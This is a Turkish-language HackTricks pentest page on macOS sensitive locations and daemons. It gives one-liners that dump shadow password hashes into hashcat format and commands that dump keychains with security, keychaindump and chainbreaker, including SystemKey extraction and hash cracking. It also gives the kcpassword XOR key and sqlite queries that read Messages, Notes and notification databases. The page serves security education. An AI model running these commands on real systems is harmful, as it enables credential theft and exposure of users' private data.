# macOS Hassas Konumlar ve İlginç Daemonlar

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek hacking püf noktalarını paylaşın.

</details>
{% endhint %}

## Parolalar

### Shadow Parolaları

Shadow parolaları, kullanıcının yapılandırmasıyla birlikte **`/var/db/dslocal/nodes/Default/users/`** konumundaki plist'lerde saklanır.\
Aşağıdaki oneliner, **kullanıcılar hakkındaki tüm bilgileri** (hash bilgileri dahil) dökmek için kullanılabilir:

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Bu gibi betikler**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) veya [**bu**](https://github.com/octomagon/davegrohl.git) **gibi** betikler, **hashcat formatına** dönüştürmek için kullanılabilir.

Tüm hizmet hesaplarında olmayan kimlik bilgilerini **hashcat formatında** dökümleyecek alternatif bir tek satırlık komut `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
### Anahtarlık Dökümü

Güvenlik ikilisini kullanarak **şifreleri şifrelenmiş olarak dökmek** için birkaç uyarı penceresi kullanıcıdan bu işlemi izin vermesini isteyecektir.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Bu yorum temel alınarak [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) gibi görünüyor ki bu araçlar artık Big Sur'da çalışmıyor.
{% endhint %}

### Keychaindump Genel Bakış

**keychaindump** adlı bir araç, macOS anahtarlıklarından şifreleri çıkarmak için geliştirilmiştir, ancak Big Sur gibi yeni macOS sürümlerinde sınırlamalarla karşılaşmaktadır, [tartışmada](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) belirtildiği gibi. **keychaindump**'ın kullanımı saldırganın **root** erişimi elde etmesini ve ayrıcalıklarını yükseltmesini gerektirir. Araç, anahtarlığın kullanıcı girişinde varsayılan olarak kilidini açık tutulması gerçeğinden yararlanır, böylece uygulamaların kullanıcının şifresini sürekli olarak girmesini gerektirmeden erişmesine izin verir. Ancak, bir kullanıcının her kullanımdan sonra anahtarlığını kilitlemeyi tercih etmesi durumunda, **keychaindump** etkisiz hale gelir.

**Keychaindump**, Apple tarafından yetkilendirme ve kriptografik işlemler için önemli olan **securityd** adlı belirli bir işlemi hedef alarak çalışır. Çıkarma işlemi, kullanıcının giriş şifresinden türetilen bir **Anahtar Ustası**'nı tanımlamayı içerir. Bu anahtar, anahtarlık dosyasını okumak için gereklidir. **Master Key**'i bulmak için **keychaindump**, potansiyel anahtarları aramak için `MALLOC_TINY` olarak işaretlenen alanlarda **securityd**'nin bellek yığınını `vmmap` komutunu kullanarak tarar. Bu bellek konumlarını incelemek için aşağıdaki komut kullanılır:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Potansiyel anahtarları belirledikten sonra, **keychaindump**, anahtar adayını belirten (`0x0000000000000018`) belirli bir deseni aramak için heap'leri tarar. Bu anahtarı kullanmak için deşifre etme de dahil olmak üzere daha fazla adım, **keychaindump**'ın kaynak kodunda belirtildiği gibi gereklidir. Bu alana odaklanan analistler, anahtar zincirini şifrelemek için gerekli olan kritik verilerin **securityd** işlemi belleğinde saklandığını unutmamalıdır. **keychaindump**'ı çalıştırmak için bir örnek komut:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker), bir OSX anahtar zincirinden aşağıdaki türde bilgileri adli olarak güvenilir bir şekilde çıkarmak için kullanılabilir:

* Hashlenmiş Keychain şifresi, [hashcat](https://hashcat.net/hashcat/) veya [John the Ripper](https://www.openwall.com/john/) ile kırılmak üzere uygun
* İnternet Şifreleri
* Genel Şifreler
* Özel Anahtarlar
* Genel Anahtarlar
* X509 Sertifikaları
* Güvenli Notlar
* Appleshare Şifreleri

Anahtar zincirini açma şifresi, [volafox](https://github.com/n0fate/volafox) veya [volatility](https://github.com/volatilityfoundation/volatility) ile elde edilen bir anahtar veya SystemKey gibi bir açma dosyası ile Chainbreaker, ayrıca düz metin şifreleri sağlayacaktır.

Bu yöntemlerden birine sahip olmadan Anahtar Zincirini açma, Chainbreaker tüm diğer mevcut bilgileri gösterecektir.

#### **Anahtar zinciri anahtarlarını dök**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **SystemKey ile anahtarlık anahtarlarını (şifrelerle birlikte) dökün**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Anahtarlık anahtarlarını (şifrelerle birlikte) kırarak dökün**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Hafıza dökümü ile anahtarlık anahtarlarını (şifrelerle birlikte) dökün**

[Şu adımları izleyin](../#dumping-memory-with-osxpmem) **bir hafıza dökümü** gerçekleştirmek için
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Kullanıcı şifresini kullanarak anahtarlık anahtarlarını (şifrelerle birlikte) dökme**

Kullanıcı şifresini bildiğinizde, bunu kullanarak kullanıcıya ait anahtarlıkları **dökebilir ve şifreleyebilirsiniz**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword** dosyası, yalnızca sistem sahibi **otomatik girişi etkinleştirmişse** kullanıcının **giriş şifresini** tutan bir dosyadır. Bu nedenle, kullanıcıya şifre sorulmadan otomatik olarak giriş yapılacaktır (bu çok güvenli değildir).

Şifre, **`/etc/kcpassword`** dosyasında **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** anahtarı ile XOR işlemine tabi tutularak saklanır. Kullanıcının şifresi anahtardan daha uzunsa, anahtar tekrar kullanılacaktır.\
Bu, şifrenin oldukça kolay bir şekilde kurtarılmasını sağlar, örneğin [**bu gibi**](https://gist.github.com/opshope/32f65875d45215c3677d) betikler kullanılarak. 

## Veritabanlarında İlginç Bilgiler

### Mesajlar
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Bildirimler

Bildirimler verilerini `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` dizininde bulabilirsiniz.

Çoğu ilginç bilgi **blob** içinde olacaktır. Bu nedenle, o içeriği **çıkartmanız** ve insanların **okuyabileceği** hale **dönüştürmeniz** veya **`strings`** kullanmanız gerekecek. Buna erişmek için şunu yapabilirsiniz:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Notlar

Kullanıcıların **notları**, `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` dizininde bulunabilir. 

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## Tercihler

macOS uygulamalarındaki tercihler **`$HOME/Library/Preferences`** konumundadır ve iOS'ta ise `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences` konumundadır.&#x20;

macOS'ta **`defaults`** adlı cli aracı **Tercihler dosyasını değiştirmek** için kullanılabilir.

**`/usr/sbin/cfprefsd`** XPC hizmetlerini `com.apple.cfprefsd.daemon` ve `com.apple.cfprefsd.agent` iddialıdır ve tercihleri değiştirmek gibi eylemleri gerçekleştirmek için çağrılabilir.

## Sistem Bildirimleri

### Darwin Bildirimleri

Bildirimler için ana daemon **`/usr/sbin/notifyd`**'dir. Bildirimleri almak için istemcilerin `com.apple.system.notification_center` Mach portu üzerinden kaydolmaları gerekir (`sudo lsmp -p <pid notifyd>` ile kontrol edin). Daemon, `/etc/notify.conf` dosyası ile yapılandırılabilir.

Bildirimler için kullanılan isimler benzersiz ters DNS gösterimleridir ve bir bildirim birine gönderildiğinde, bunu işleyebileceğini belirten istemciler alacaktır.

Mevcut durumu (ve tüm isimleri görmek) göndererek görmek mümkündür. notifyd işlemine SIGUSR2 sinyali göndererek ve oluşturulan dosyayı okuyarak: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Dağıtılmış Bildirim Merkezi

Ana ikili dosyası **`/usr/sbin/distnoted`** olan **Dağıtılmış Bildirim Merkezi**, bildirim göndermenin başka bir yoludur. Bazı XPC hizmetlerini açığa çıkarır ve istemcileri doğrulamak için bazı kontroller yapar.

### Apple Push Bildirimleri (APN)

Bu durumda, uygulamalar **konular** için kayıt oluşturabilir. İstemci, Apple'ın sunucularına **`apsd`** aracılığıyla ulaşarak bir belirteç oluşturacaktır.\
Daha sonra sağlayıcılar da bir belirteç oluşturacak ve Apple'ın sunucularına bağlanarak mesajları istemcilere gönderebilecektir. Bu mesajlar yerel olarak **`apsd`** tarafından alınacak ve bekleyen uygulamaya iletilen bildirimi iletecektir.

Tercihler, `/Library/Preferences/com.apple.apsd.plist` konumundadır.

macOS'ta `/Library/Application\ Support/ApplePushService/aps.db` ve iOS'ta `/var/mobile/Library/ApplePushService` konumunda mesajların yerel veritabanı bulunmaktadır. 3 tabloya sahiptir: `incoming_messages`, `outgoing_messages` ve `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Ayrıca, şu kullanılarak daemon ve bağlantılar hakkında bilgi almak mümkündür:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Kullanıcı Bildirimleri

Bu, kullanıcının ekranda görmesi gereken bildirimlerdir:

- **`CFUserNotification`**: Bu API, ekranda bir mesajla çıkan bir pencere göstermenin bir yolunu sağlar.
- **Bülten Panosu**: Bu, iOS'ta kaybolan bir banner gösterir ve Bildirim Merkezi'nde saklanır.
- **`NSUserNotificationCenter`**: Bu, MacOS'ta iOS bülten panosudur. Bildirimlerle ilgili veritabanı `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db` konumundadır.
